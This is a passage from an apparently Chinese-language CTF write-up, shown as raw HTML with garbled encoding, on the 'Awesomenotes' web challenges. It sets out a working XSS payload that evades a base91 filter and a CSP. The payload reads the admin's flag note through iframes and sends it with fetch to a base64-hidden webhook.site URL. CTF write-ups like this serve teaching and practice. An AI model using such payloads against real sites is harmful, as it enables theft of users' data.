keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>r<span class="token string">"^[a-f0-9]+$"</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span> <span class="token operator">and</span> len<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token operator">=</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result<span class="token operator">=</span>bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>text<span class="token punctuation">)</span>    encoded <span class="token operator">=</span> based91<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">return</span> encodeddata <span class="token operator">=</span> based91<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"&lt;script>alert(1)&lt;/script>11"</span><span class="token punctuation">)</span>hex_data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payloadï¼š"</span><span class="token operator">+</span>hex_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base91ç¼–ç åï¼š"</span><span class="token operator">+</span>timu<span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span><span class="token punctuation">)</span>payloadï¼šf0afecd5baf31dd4ce9eff0dc33f1a4405311458326bbase91ç¼–ç åï¼š<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è²Œä¼¼ç”±äºç¼–è§£ç çš„é—®é¢˜å¯¼è‡´ç”Ÿæˆçš„å†…å®¹æœ€åä¼šæœ‰äº›å¤±çœŸï¼Œæ‰€ä»¥æˆ‘æœ€ååŠ ä¸Šäº†ä¸€äº›è„å­—ç¬¦<code>11</code>ã€‚</p><p>ä½¿ç”¨ç”Ÿæˆçš„<code>payload</code>åˆ›å»º<code>note</code>å³å¯<code>xss</code></p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697518703324.png" alt="1697518703324"></p><h5 id="step2-bypass-base91-alphabet"><a href="#step2-bypass-base91-alphabet" class="headerlink" title="step2 bypass base91_alphabet"></a>step2 bypass base91_alphabet</h5><p>æ­£å½“æˆ‘ä»¥ä¸ºæ‹¿ä¸‹è¿™ä¸ªç­¾åˆ°é¢˜çš„æ—¶å€™ï¼Œæˆ‘æƒŠå–œçš„å‘ç°<code>base91</code>å­—ç¬¦è¡¨é‡Œæ²¡æœ‰<code>.</code>ã€‚è€Œä¸€èˆ¬çš„<code>payload</code>éƒ½ä¼šç”¨åˆ°ç‚¹ã€‚</p><pre><code>base91_alphabet = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;,    &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;,    &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;,    &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;,    &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;!&#39;, &#39;#&#39;, &#39;$&#39;,    &#39;%&#39;, &#39;â‚¬&#39;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;Â°&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;,    &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;]&#39;, &#39;^&#39;, &#39;_&#39;, &#39;`&#39;, &#39;&#123;&#39;, &#39;|&#39;, &#39;&#125;&#39;, &#39;~&#39;, &#39;&quot;&#39;]</code></pre><p>æœ¬æ¥æƒ³ç”¨<code>eval(String.fromCharCode())</code>ã€‚</p><p>ä½†ä»–è®¾ç½®äº†<code>unsafe-inline</code>ï¼Œè¿™æ˜¯ä¸ªéå¸¸å®½æ¾çš„é™åˆ¶ï¼Œä½†æ˜¯é™åˆ¶äº†<code>eval</code>ï¼Œå¹¶ä¸”ä¸èƒ½è¿œç¨‹åŠ è½½<code>js</code>ã€‚</p><pre class="line-numbers language-python"><code class="language-python">    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"script-src 'unsafe-inline';"</span>    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>js</code>å±‚é¢çš„ç»•è¿‡æœ‰selfå–å±æ€§ç»•è¿‡ã€‚</p><pre><code>document.location               &lt;===&gt;           self[&quot;document&quot;][&quot;location&quot;]</code></pre><p>ä¹Ÿä¸èƒ½ç”¨ç©ºæ ¼ï¼Œæ ‡ç­¾ä¸­çš„å±æ€§ç©ºæ ¼å¯ä»¥ç”¨&#x2F;æ¥ä»£æ›¿ï¼Œä½†å®é™…åˆ©ç”¨ä¸­ç©ºæ ¼æ˜¯ç”¨ä¸åˆ°çš„ã€‚</p><h5 id="step3-bypass-http-only"><a href="#step3-bypass-http-only" class="headerlink" title="step3 bypass http only"></a>step3 bypass http only</h5><p>æœ€å¸¸è§çš„æ€è·¯å°±æ˜¯æŠŠç®¡ç†å‘˜<code>cookie</code>å·å‡ºæ¥ã€‚ä½†ç”±äº<code>cookie</code>è®¾ç½®äº†<code>http only</code>ï¼Œå¯¼è‡´æ— æ³•ç”¨<code>js</code>è·å–<code>cookie</code>ã€‚é‚£ä¹ˆåªèƒ½æ“æ§<code>admin</code>ï¼Œè®©ä»–å…ˆè®¿é—®<code>/</code>è·¯ç”±è·å–ç¬¬ä¸€ä¸ª<code>noteid</code>ï¼ˆå³<code>flag</code>çš„<code>noteid</code>ï¼‰ï¼Œç„¶åè®¿é—®<code>/e/noteid</code>ï¼Œå–å‡ºæ¥<code>flag</code>å°±è¡Œäº†ã€‚</p><p>è¿™é‡Œé€‰æ‹©æ“æ§ä¸¤ä¸ª<code>frame</code>ï¼Œç¬¬ä¸€ä¸ª<code>frame</code>è®¿é—®æ ¹ç›®å½•è·å–<code>noteid</code>ï¼Œç¬¬äºŒä¸ª<code>frame</code>è®¿é—®<code>/e/noteid</code>è·å–<code>flag</code>ï¼Œæœ€åå‘ç»™<code>dnslog</code>ã€‚</p><p>ç…§ç€ä»¥ä¸Šåˆ†æé€»è¾‘å†™å°±è¡Œäº†ï¼Œé€šè¿‡<code>createElement</code>åˆ›å»º<code>frame</code>ã€‚éœ€è¦è°ƒè¯•çš„å°±æ˜¯å¦‚ä½•å–<code>noteid</code>ä»¥åŠ<code>flag</code>ã€‚è¿™ä¸ªå¯ä»¥è‡ªå·±åˆ›å»ºä¸ªè´¦å·ç¬¬ä¸€ä¸ª<code>note</code>å†™ä¸ª<code>testflag</code>æ¥æ¨¡æ‹Ÿæµ‹è¯•ã€‚</p><p>è¿‡æ»¤äº†<code>.</code>ç”¨<code>atob</code>å‡½æ•°è§£ç ä¸€å±‚å³å¯ç»•è¿‡ã€‚</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>    f1<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ç¬¬ä¸€ä¸ªframe</span>    f1<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>    f1<span class="token punctuation">.</span>onload<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        i<span class="token operator">=</span>f1<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è·å–ç¬¬ä¸€ä¸ªnoteidï¼Œflag noteid</span>        f2<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f2<span class="token punctuation">.</span>src<span class="token operator">==</span><span class="token string">"/e/"</span><span class="token operator">+</span>i<span class="token punctuation">;</span>        f2<span class="token punctuation">.</span>onload<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>            f<span class="token operator">=</span>frame2<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è·å–flag</span>            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åç”¨<code>self</code>ä¸€ä¸ªä¸€ä¸ªå¥—ä¸Šå³å¯ã€‚</p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> based91<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>'<span class="token operator">&lt;</span>script<span class="token operator">></span>\f1<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>\        i<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByTagName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\        f2<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\        self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/e/"</span><span class="token operator">+</span>i<span class="token punctuation">;</span>\        self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>\            f<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByClassName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"innerHTML"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\            fetch<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>\        <span class="token punctuation">}</span><span class="token punctuation">;</span>\        self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>\    <span class="token punctuation">}</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span>\<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span>\'<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(data)</span>hex_data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"payloadï¼š"</span><span class="token operator">+</span>hex_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"base91ç¼–ç åï¼š"</span><span class="token operator">+</span>timu<span class="token punctuation">(</span>hex_data<span class="token punctuation">)</span><span class="token punctuation">)</span>payloadï¼šf0afecd5baf36d2fe35f5153e7a98a43c1b6fdb60276742755ad32a0627856d0ca0402f620f064a525686588df5f5153e75f6b06ece8feef4301f625f0087c7f454d9d7fad19b0a34b3aa7669636c0d8fd860f381b8b7f454d9d7fad19b0a33ba90277ad4c200bb3533811b03f8155ce0e422b1308d89f406595199e15b432818760dee8ada504ad007b1088013e74affe045e2b1808d8a156e5b6562aeb09ac7276105a9940c0fe04963dae74ad561a68db6f2be0088663688fb37180edda5aa9ac27306a02f627b0ee6980b1bb4947689ebcacad95ca7a02a326607f020b5c974b5380dd038f6e70efb7ad95ca7a02a326607f02a99c09dc6fffe7bf553917b0a3a72a0e05dbf6db0ad8d17557075c69a06dbf45bfe398d27cdf32e16c1ce008f67fc7698851350ef0a16bf527f0bf452b54714512c07d9dac4294fccd80c12908bc148d3253a8d2e8a83cd74f906b9a860fbd81ba1f910cb50dff5c3f9b2ddb7c409510cfe80cac84111491d93050457600fb18f17a36def1d90cc61ce91c3722eb36c44bab5d076c6ba5b29ec02a6707a1950904ec4fe0941b8f80fd096c75d3ca4ef5aea4b6018ee0a8d9ae03b6b552594f6095b383d0ca0402f62770ca8d47c0fe04b6ba6965a77a5752db0047b0bd6cd73f1a4405311458326bbase91ç¼–ç åï¼š<span class="token operator">&lt;</span>script<span class="token operator">></span>f1<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>i<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByTagName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>f2<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/e/"</span><span class="token operator">+</span>i<span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>f<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f2"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByClassName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"subtitle"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"innerHTML"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>fetch<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h5><p>æŠŠ<code>payload</code>æä¸Šå»ï¼Œç»™<code>admin</code>ä¸¾æŠ¥å°±è¡Œäº†ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697524432906.png" alt="1697524432906"></p><p>åæ¥æˆ‘å‘ç°<code>/e/</code>è¿™ä¸ªè·¯ç”±å‹æ ¹å°±æ²¡æœ‰é‰´æƒæœºåˆ¶ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸ç”¨å¼€ä¸¤ä¸ª<code>iframe</code>ã€‚ç›´æ¥ä¸€ä¸ª<code>frame</code>è·å–<code>noteid</code>ï¼Œç„¶åè®¿é—®è¿™ä¸ª<code>note</code>å°±å¯ä»¥äº†æ“ã€‚</p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> based91<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>'<span class="token operator">&lt;</span>script<span class="token operator">></span>\f1<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"createElement"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"onload"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>\        i<span class="token operator">=</span>self<span class="token punctuation">[</span><span class="token string">"f1"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"contentWindow"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"getElementsByTagName"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\        fetch<span class="token punctuation">(</span>atob<span class="token punctuation">(</span><span class="token string">"aHR0cHM6Ly93ZWJob29rLnNpdGUvZTU4ZWZmYTgtZDlkOS00OGEwLTk4ZjItMjJhOTYyOTYxYzIyLw=="</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>\    <span class="token punctuation">}</span><span class="token punctuation">;</span>\    self<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"body"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"appendChild"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">;</span>\<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">11</span>\'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1697524680159.png" alt="1697524680159"></p><h4 id="Awesomenotes-I"><a href="#Awesomenotes-I" class="headerlink" title="Awesomenotes I"></a>Awesomenotes I</h4><p>è¿™é¢˜æ„Ÿè§‰æ¯”å‰é¢é‚£é“ç®€å•å¤šäº†ï¼Œæœ€èµ·ç è¿™é“é¢˜ä¸€ä¸ªå°æ—¶å†…åšå®Œäº†ã€‚ä½†æ˜¯è€ƒçš„ä¸œè¥¿æ¯”è¾ƒæ–°é¢–ã€‚</p><p>ä¹Ÿæ˜¯<code>note</code>é¢˜ã€‚æœ‰ç”¨çš„å°±ä¿©å‡½æ•°ã€‚<code>/get_note</code>è¯´æ˜å¦‚æœæ˜¯<code>admin</code>çš„è¯å°±èƒ½æ‹¿åˆ°<code>flag</code>ï¼Œè¿™ä¸ª<code>cookie</code>æ˜¯åœ¨ç¯å¢ƒå˜é‡é‡Œçš„ï¼Œæ‰€ä»¥æ ¹æœ¬æ²¡æ³•ä¼ªé€ ï¼Œå¥¹ä¹Ÿä¸ä¼šç»™ç”¨æˆ·<code>cookie</code>ã€‚</p><pre class="line-numbers language-ruby"><code class="language-ruby">async fn <span class="token function">get_note</span><span class="token punctuation">(</span>    <span class="token function">Path</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token constant">Path</span><span class="token operator">&lt;</span><span class="token builtin">String</span><span class="token operator">></span><span class="token punctuation">,</span>    <span class="token function">TypedHeader</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token constant">TypedHeader</span><span class="token operator">&lt;</span><span class="token constant">Cookie</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">Result</span><span class="token operator">&lt;</span><span class="token constant">Html</span><span class="token operator">&lt;</span><span class="token builtin">String</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>'static str<span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token operator">&amp;</span>note <span class="token operator">==</span> <span class="token string">"flag"</span> <span class="token punctuation">{</span>        let <span class="token function">Some</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:UNAUTHORIZED</span><span class="token punctuation">,</span> <span class="token string">"Missing session cookie"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> name <span class="token operator">!=</span> std<span class="token punctuation">:</span><span class="token symbol">:env</span><span class="token punctuation">:</span><span class="token symbol">:var</span><span class="token punctuation">(</span><span class="token string">"ADMIN_SESSION"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Missing ADMIN_SESSION"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">(</span>                <span class="token constant">StatusCode</span><span class="token punctuation">:</span><span class="token symbol">:UNAUTHORIZED</span><span class="token punctuation">,</span>                <span class="token string">"You are not allowed to read this note"</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span 